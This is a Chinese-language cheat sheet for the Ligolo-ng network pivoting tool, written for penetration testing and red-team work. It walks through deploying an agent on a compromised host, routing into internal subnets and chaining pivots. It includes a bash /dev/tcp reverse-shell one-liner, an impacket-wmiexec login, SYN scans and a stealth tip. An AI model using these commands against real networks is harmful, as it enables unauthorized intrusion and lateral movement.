<!-- language-home-navigation -->
[🏠 中文主页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🔀 Ligolo-ng - 完整备忘单

[🇹🇷 Türkçe Sürüm]（翻译/README.tr.md）
```
  ██╗     ██╗ ██████╗  ██████╗ ██╗      ██████╗      ███╗   ██╗ ██████╗ 
  ██║     ██║██╔════╝ ██╔═══██╗██║     ██╔═══██╗     ████╗  ██║██╔════╝ 
  ██║     ██║██║  ███╗██║   ██║██║     ██║   ██║     ██╔██╗ ██║██║  ███╗
  ██║     ██║██║   ██║██║   ██║██║     ██║   ██║     ██║╚██╗██║██║   ██║
  ███████╗██║╚██████╔╝╚██████╔╝███████╗╚██████╔╝     ██║ ╚████║╚██████╔╝
  ╚══════╝╚═╝ ╚═════╝  ╚═════╝ ╚══════╝ ╚═════╝      ╚═╝  ╚═══╝ ╚═════╝ 
                 Advanced TUN-based Pivoting Tool
```
<p对齐=“中心”>
  <img src="https://img.shields.io/badge/Ligolo--ng-Pivoting-blue?style=for-the-badge" alt="Ligolo-ng">
  <img src="https://img.shields.io/badge/TUN_Interface-VPN_Style-green?style=for-the-badge" alt="TUN 接口">
  <img src="https://img.shields.io/badge/Go-Cross_Platform-orange?style=for-the-badge" alt="Go">
  <img src="https://img.shields.io/badge/Network_Pivoting-red?style=for-the-badge" alt="网络旋转">
</p>

<p对齐=“中心”>
  <b>🌐现代、简单且高性能的旋转工具，使用 TUN 接口而不是 SOCKS 代理</b>
</p>

---

## 📋 目录

- [简介](#-简介)
- [为什么是 Ligolo-ng？ （Ligolo-ng 与 SOCKS/Proxychains）]（#-why-ligolo-ng）
- [架构及其工作原理](#-architecture--how-it-works)
- [安装](#-安装)
- [快速入门指南](#-quick-start-guide)
  - [第 1 步：在攻击者上设置 TUN 接口](#step-1-setup-tun-interface-on-attacker)
  - [步骤 2：启动 Ligolo-ng 代理](#step-2-start-the-ligolo-ng-proxy)
  - [步骤 3：在 Pivot 目标上部署代理](#step-3-deploy-the-agent-on-pivot-target)
  - [步骤 4：在攻击者上配置路由](#step-4-configure-routing-on-attacker)
  - [步骤 5：启动隧道会话](#step-5-start-the-tunnel-session)
- [反向端口转发（侦听器）](#-reverse-port-forwarding-listeners)
- [双旋转（多层旋转）](#-double-pivoting-multi-tier-pivoting)
- [代理交互命令参考](#-proxy-interactive-commands-reference)
- [代理命令行选项](#-agent-command-line-options)
- [疑难解答和最佳实践](#-troubleshooting--best-practices)
- [法律免责声明](#-legal-disclaimer)
- [资源](#-资源)

---

## 🎯 简介

**Ligolo-ng** 是一种用 Go 编写的先进、轻量级且快速的隧道和旋转工具。与传统的 SOCKS 代理（例如标准 Chisel 或 SSH 动态转发）不同，Ligolo-ng 直接在攻击者计算机上建立虚拟 **TUN 接口**。

这会将您受感染的枢轴主机变成真正的类似 VPN 的网关：攻击者计算机上的所有工具（包括 `nmap -sS`、`crackmapexec`、`evil-winrm`、`impacket` 和浏览器）都可以通过 IP 地址直接访问内部子网，而无需在命令中添加 `proxychains` 前缀。

---

## ⚖️ 为什么选择 Ligolo-ng？

|特色 |利戈洛-ng |代理链 + SOCKS | SSH 袜子 (`-D`) |
|--------|---------|--------------------------------|--------------------|
| **协议支持** |完整的 TCP 和 UDP |仅 TCP（UDP 较差）|仅限 TCP |
| **Nmap SYN 扫描 (`-sS`)**| ✅ 是（母语）| ❌ 否（需要 TCP `-sT`）| ❌ 否 |
| **工具兼容性** | 100%（内核IP堆栈）|不一致（LD_PRELOAD）|不一致|
| **速度和延迟** | ⭐⭐⭐⭐⭐ 非常快| ⭐⭐⭐ 中等 | ⭐⭐⭐ 中等 |
| **无袜子包装** | ✅ 是的 | ❌需要包装| ❌需要包装|
| **反向监听器** | ✅ 内置 | ❌需要单独的工具| ❌ 有限|

---

## 🏗️ 架构及其工作原理
```
+-------------------+                          +---------------------+                          +----------------------+
|  Attacker Machine |                          | Pivot Target (Host) |                          | Internal Subnet Host |
| (192.168.1.100)   |                          | (Dual-homed)        |                          | (172.16.1.50)        |
|                   |                          |                     |                          |                      |
| [proxy server]    | <=== TLS Tunnel =======> | [ligolo agent]      |                          |                      |
|    ^              |      (Port 11601)        |    |                |                          |                      |
|    |              |                          |    |                |                          |                      |
| [tun0 interface]  |                          |    +--------------->| == Internal Traffic ===> | [Target Service]     |
| (172.16.1.0/24)   |                          |     (172.16.1.10)   |                          | (Port 445, 80, etc.) |
+-------------------+                          +---------------------+                          +----------------------+
```
1. **代理：** 在攻击者计算机上运行，​​管理会话，并在虚拟 TUN 接口和连接的代理之间桥接数据包。
2. **代理：** 在受感染的内部计算机（Linux、Windows、macOS 或 ARM）上执行的轻量级二进制文件。
3. **TUN 接口：** 在 Linux 上创建的软件环回网络接口，可将发往内部子网的流量直接路由到 Ligolo。

---

## 📥 安装

从官方 GitHub 发布页面下载 **proxy** 和 **agent** 的最新版本二进制文件：
```bash
# Download latest proxy for Linux
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_proxy_0.7.2-alpha_linux_amd64.tar.gz
tar -zxvf ligolo-ng_proxy_0.7.2-alpha_linux_amd64.tar.gz -C /opt/ligolo-proxy/

# Download agents for various targets
# Linux Agent
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_agent_0.7.2-alpha_linux_amd64.tar.gz
tar -zxvf ligolo-ng_agent_0.7.2-alpha_linux_amd64.tar.gz -C /opt/ligolo-agents/linux/

# Windows Agent
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_agent_0.7.2-alpha_windows_amd64.zip
unzip ligolo-ng_agent_0.7.2-alpha_windows_amd64.zip -d /opt/ligolo-agents/windows/
```
---

## 🚀 快速入门指南

### 第 1 步：在攻击者上设置 TUN 接口

在运行代理之前，请在 Linux 攻击者计算机上创建持久 TUN 设备：
```bash
# Create a TUN interface named "ligolo"
sudo ip tuntap add user $USER mode tun ligolo

# Bring the interface UP
sudo ip link set ligolo up

# Verify interface state
ip link show ligolo
```
### 步骤 2：启动 Ligolo-ng 代理

使用自签名 TLS 证书运行代理：
```bash
cd /opt/ligolo-proxy/
./proxy -self-cert -laddr 0.0.0.0:11601
```
> **提示：** 您还可以使用 `-certfile` 和 `-keyfile` 提供有效的 Let's Encrypt 证书，以便在红队交战中进行隐秘操作。

### 步骤 3：在 Pivot 目标上部署代理

将代理传输到受感染的主机并执行它：

#### 在 Linux 目标上：
```bash
chmod +x agent
./agent -connect 192.168.1.100:11601 -ignore-cert
```
#### 在 Windows 目标上：
```powershell
.\agent.exe -connect 192.168.1.100:11601 -ignore-cert
```
### 步骤 4：在攻击者上配置路由

代理连接后，从代理控制台检查其网络接口以确定目标的内部子网（例如 `172.16.1.0/24`）。

在您的**攻击者终端**（单独的窗口）上，添加指向 TUN 接口的路由：
```bash
# Route internal subnet through ligolo TUN device
sudo ip route add 172.16.1.0/24 dev ligolo

# Check route table
ip route show | grep ligolo
```
### 步骤 5：启动隧道会话

在交互式 Ligolo-ng 代理提示符中：
```text
ligolo-ng » session
? Select a session: 1 - user@PIVOT-HOST - 192.168.1.50:52418
[Agent : user@PIVOT-HOST] » start
[Agent : user@PIVOT-HOST] » INFO[0025] Tunnel started
```
现在您可以直接、本机 IP 访问内部网络！测试一下：
```bash
# Ping internal host
ping -c 3 172.16.1.50

# Native Nmap SYN scan without proxychains!
nmap -sS -Pn -T4 -p 80,445,3389 172.16.1.50

# Run Impacket directly
impacket-wmiexec DOMAIN/admin:Password@172.16.1.50
```
---

## 🔄 反向端口转发（监听器）

想要从无法路由回攻击者 IP 的内部主机接收反向 shell 或在攻击者机器上捕获 NTLM 身份验证中继？使用**监听器**！

当您在 Ligolo-ng 中配置侦听器时，代理会在 **pivot 计算机** 上打开侦听端口，并将传入流量中继回攻击者计算机。

### 示例：捕获反向 Shell

在代理会话内部：
```text
[Agent : user@PIVOT-HOST] » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
INFO[0035] Listener created on 0.0.0.0:4444
```
在您的**攻击者机器上**：
```bash
nc -lvnp 4444
```
在 **内部目标** (`172.16.1.75`) 上：
```bash
# Send reverse shell to the pivot host's internal IP
bash -i >& /dev/tcp/172.16.1.10/4444 0>&1
```
枢轴主机将连接直接转发到您的 Netcat 侦听器！

---

## ⛓️ 双旋转（多层旋转）

访问深度嵌套网络时（子网 A -> 子网 B -> 子网 C）：

1. 建立到枢轴 1 (`172.16.1.10`) 的初始隧道。
2. 发现位于子网 B (`10.0.0.25`) 中的数据透视表 2。
3. 在 Pivot 1 上设置侦听器，将流量从子网 B 转发回代理端口 `11601`：
   ```text
   [Agent : Pivot1] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
   ```
4. 在 Pivot 2 上部署 Ligolo 代理并连接到 Pivot 1 的 IP：
   ```bash
   ./agent -connect 172.16.1.10:11601 -ignore-cert
   ```
5. 第二个会话将出现在您的代理中！添加子网 C 的路由：
   ```bash
   sudo ip route add 10.0.0.0/24 dev ligolo
   ```
6. 切换到会话 2 并键入 `start`。

---

## ⌨️ 代理交互命令参考

|命令 |描述 |示例|
|---------|-------------|---------|
| `session` |列出并选择活动的连接代理会话 | `session` |
| `start` |开始通过主动代理对数据包进行隧道传输 | `start` |
| `stop` |停止活动隧道会话 | `stop` |
| `ifconfig` |显示所选代理的网络接口 | `ifconfig` |
| `listener_add` |在pivot代理上创建监听端口 | `listener_add --addr 0.0.0.0:8443 --to 127.0.0.1:8443`|
| `listener_list`|列出当前代理上的所有活动侦听器 | `listener_list` |
| `listener_close`|关闭特定的活动侦听器 | `listener_close --id 0` |
| `help`|显示命令帮助 | `help`|
| `exit`|终止代理或返回主菜单 | `exit`|

---

## ⚙️ 代理命令行选项

|旗帜|描述 |示例|
|------|-------------|---------|
| `-connect` | Ligolo 代理的地址和端口 | `-connect 192.168.1.100:11601` |
| `-ignore-cert` |跳过 TLS 证书验证 | `-ignore-cert` |
| `-retry` |如果断开连接，自动重试连接 | `-retry` |
| `-auto-clear` |执行时清除终端输出 | `-auto-clear` |

---

## 💡 故障排除和最佳实践

1. **参与后删除TUN接口：**
   测试完成后，清理路由表并删除虚拟接口：
   ```bash
   sudo ip link set ligolo down
   sudo ip tuntap del mode tun ligolo
   ```
2. **仔细检查 IP 子网重叠：**
   确保您正在路由的内部子网（例如 `192.168.1.0/24`）不会与本地攻击者网络发生冲突。如果重叠，请使用更具体的 `/32` 主机路由（例如 `sudo ip route add 192.168.1.50/32 dev ligolo`）。
3. **Pivot 上的防火墙注意事项：**
   在 Windows 目标上，确保 Windows Defender 防火墙允许端口 11601 或您选择的侦听器端口上的传出连接。
4. **在真实环境中使用`-retry`：**
   始终使用 `-retry` 运行代理，以便在短暂的网络中断后自动重新建立连接。

---

## ⚠️ 法律免责声明

> **重要：** Ligolo-ng 是一个功能强大的网络路由实用程序。它只能在经过明确书面同意的授权渗透测试、红队参与和道德安全评估期间使用。

---

## 📚 资源

- [Ligolo-ng 官方 GitHub 存储库](https://github.com/nicocha30/ligolo-ng)
- [Ligolo-ng 官方文档](https://github.com/nicocha30/ligolo-ng/blob/master/DOCUMENTATION.md)